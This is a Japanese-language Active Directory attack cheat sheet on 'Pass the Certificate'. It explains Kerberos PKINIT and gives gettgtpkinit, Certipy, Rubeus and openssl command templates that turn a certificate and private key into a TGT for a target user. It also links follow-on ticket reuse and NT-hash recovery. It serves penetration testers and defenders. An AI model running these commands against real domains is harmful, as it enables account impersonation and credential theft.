# Pass the Certificate

Kerberos認証プロトコルは、アクセスを許可するためにチケットを使用する。ST（Service Ticket）は、TGT（Ticket Granting Ticket）を提示することで取得できる。その前のTGTは、「事前認証」と呼ばれる最初のステップを検証することによってのみ取得できる（ただし、一部のアカウントでその要件が明示的に削除されている場合は、[ASREProast]()に対して脆弱になる）。事前認証は、対称的に(DES、RC4、AES128、またはAES256鍵で)検証することも、 非対称的に(証明書で)検証することもできる。非対称的な事前認証の方法は、PKINITと呼ばれる。

Pass the Certificateとは、TGT を取得するためにパスする証明書（鍵ペア）に依存する事前認証操作に付けられる仮の名前である。この操作は、[Shadow Credentials](https://github.com/namahano/Cheat-Sheet/blob/main/Active%20Directory/Kerberos/Shadow%20Credentials.md)、[AD CS Domain Escalation](https://github.com/namahano/Cheat-Sheet/blob/main/Active%20Directory/Certificate%20Service%20(AD-CS)/AD%20CS%20Domain%20Escalation.md)、[UnPAC-The-Hash](https://github.com/namahano/Cheat-Sheet/blob/main/Active%20Directory/Kerberos/UnPAC%20The%20Hash.md)とともによく実行される。

「証明書 + 秘密鍵」のペアは通常、次のように使用される

- PEM 証明書 + PEM 秘密鍵
- PFX 証明書のエクスポート (秘密鍵を含む) + PFX パスワード (PFX 証明書のエクスポートを保護する)

## Pass-The-Certificate

### Linux

#### PKINITools (gettgtpkinit.py)

PFX 証明書 (ファイル) + パスワード (文字列、オプション)

```
gettgtpkinit -cert-pfx <PATH_TO_PFX_CERT> -pfx-pass <CERT_PASSWORD> <DOMAIN>/<TargetUser> <TGT_CCAHE_FILE>
```

Base64 エンコードされた PFX 証明書 (文字列) (パスワードを設定できる)

```
gettgtpkinit -pfx-base64 $(cat <PATH_TO_B64_PFX_CERT>) <DOMAIN>/<TargetUser> <TGT_CCAHE_FILE>
```

PEM 証明書 (ファイル) + PEM 秘密鍵 (ファイル)

```
gettgtpkinit.py -cert-pem <PATH_TO_PEM_CERT> -key-pem <PATH_TO_PEM_KEY> <DOMAIN>/<TargetUser>" "TGT_CCACHE_FILE"
```

#### Certipy

Certipy のコマンドは、パスワード付きの PFX をサポートしていません。次のコマンドを使用して、PFX ファイルを「保護解除」できる

```
certipy cert -export -pfx <PATH_TO_PFX_CERT> -password <CERT_PASSWORD> -out "unprotected.pfx"
```

#### 取得したチケットを悪用

取得したチケットは、次の目的で使用できる

- [Pass-The-Ticket](https://github.com/namahano/Cheat-Sheet/blob/main/Active%20Directory/Kerberos/Pass%20The%20Ticket.md)
- [UnPAC-the-hash](https://github.com/namahano/Cheat-Sheet/blob/main/Active%20Directory/Kerberos/UnPAC%20The%20Hash.md) (PKINITtools  getnthash.py )

Pass-the-Certificate に Certipy を使用すると、取得した TGT を保存するだけでなく、自動的に [UnPAC-the-hash](https://github.com/namahano/Cheat-Sheet/blob/main/Active%20Directory/Kerberos/UnPAC%20The%20Hash.md) を実行してアカウントの NT ハッシュを復元できる

### Windows

#### Rubeus

```
Rubeus.exe asktgt /user:<TargetUser> /certificate:<BASE64_CERTIFICATE> /password:<CERTIFICATE_PASSWORD> /domain:<DOMAIN> /dc:<DC_DOMAIN>" /show
```

PEM 証明書は openssl を使用して PFX 形式にエクスポートできます。Rubeus は PEM 証明書を処理しない

```
openssl pkcs12 -in cert.pem -keyex -CSP "Microsoft Enhanced Cryptographic Provider v1.0" -export -out "cert.pfx"
```

Certipy は DER 暗号化を使用します。Rubeus の PFX を生成するには、openssl を使用する

```
openssl rsa -inform DER -in key.key -out key-pem.key
openssl x509 -inform DER -in cert.crt -out cert.pem -outform PEM
openssl pkcs12 -in cert.pem -inkey key-pem.key -export -out cert.pfx
```

#### 取得したチケットを悪用

取得したチケットは、次の目的で使用できる

- [Pass-The-Ticket](https://github.com/namahano/Cheat-Sheet/blob/main/Active%20Directory/Kerberos/Pass%20The%20Ticket.md)

- [UnPAC-The-Hash](https://github.com/namahano/Cheat-Sheet/blob/main/Active%20Directory/Kerberos/UnPAC%20The%20Hash.md) 攻撃の実行 (Rubeus の asktgt コマンドに /getcredentials フラグを追加)